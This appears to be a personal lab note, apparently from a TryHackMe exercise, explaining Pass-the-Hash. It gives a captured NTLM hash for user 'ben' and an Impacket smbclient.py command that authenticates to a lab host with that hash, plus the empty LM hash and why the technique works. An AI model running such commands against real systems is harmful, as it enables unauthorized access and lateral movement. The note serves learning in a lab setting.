
If you have the NTLM hash, you **don't need to crack it**.

You have obtained the NTLM hash for the user `ben`:
```text
63CF41DC25C04B8FB79E44B1DEF12C10
```

Impacket's tools support Pass-the-Hash authentication directly. 
Use `smbclient.py` with the `-hashes` parameter:
```bash
smbclient.py thm.loc/ben@192.168.11.51 \
-hashes aad3b435b51404eeaad3b435b51404ee:63CF41DC25C04B8FB79E44B1DEF12C10
```
the tool path --> /home/eyad/.local/share/pipx/venvs/impacket/bin

### `-hashes`
Format:
```text
LM_hash:NTLM_hash
```

The common empty LM hash is:
```text
aad3b435b51404eeaad3b435b51404ee
```

**Concept:**
```text
NTLM Hash → Authentication
```

The plaintext password is **not required**.

**Why This Works:** The NTLM protocol uses the hash directly in its challenge-response mechanism. The actual plaintext password is never used after the initial hashing. As a result, possessing the hash is functionally equivalent to knowing the password when authenticating via NTLM.